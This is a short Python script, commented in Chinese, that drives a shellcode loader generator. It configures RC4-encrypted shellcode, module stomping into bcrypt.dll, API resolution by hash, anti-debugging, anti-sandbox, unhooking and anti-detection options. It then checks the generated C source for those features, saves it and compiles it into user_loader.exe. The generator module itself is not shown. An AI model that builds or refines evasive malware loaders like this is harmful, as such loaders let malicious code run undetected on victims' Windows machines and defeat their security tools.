import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from loader import generate_full_loader

print("生成用户指定配置的loader...")
result = generate_full_loader(
    shellcode_path="encrypted.bin",
    encrypt_shellcode=True,
    encryption_key="MySecureKey2024",
    arch="x64",
    load_method="Module Stomp",
    sacrificial_dll="C:\\Windows\\System32\\bcrypt.dll",
    enable_debug=True,
    use_dynamic_resolve=True,
    anti_debug=True,
    anti_sandbox=True,
    enable_unhook=True,
    enable_anti_detection=True
)

if result.startswith("#"):
    print("生成成功！")
    
    # 检查功能
    features = {
        "RC4加密": "RC4Crypt" in result,
        "解密处理": "DecryptShellcodeInMemory" in result or "RC4Crypt" in result,
        "动态API解析": "GetProcAddressByHash" in result or "HashString" in result,
        "反沙箱": "CheckSandbox" in result,
        "反调试": "CheckDebugger" in result,
        "模块踩踏": "bcrypt.dll" in result,
        "本地读取": "ReadShellcodeFromFile" in result or "LoadShellcode" in result
    }
    
    print("功能检查:")
    for feature, included in features.items():
        status = "✓" if included else "✗"
        print(f"  {status} {feature}")
    
    with open("user_loader.c", "w", encoding="utf-8") as f:
        f.write(result)
    print("已保存到 user_loader.c")
    
    # 编译
    import subprocess
    cmd = ["gcc", "-o", "user_loader.exe", "user_loader.c", "-lkernel32", "-lntdll", "-lpsapi", "-ladvapi32", "-m64", "-static"]
    result = subprocess.run(cmd, capture_output=True, encoding="utf-8", errors="replace")
    if result.returncode == 0:
        print("编译成功！")
    else:
        print("编译失败:")
        print(result.stderr)
else:
    print("生成失败")
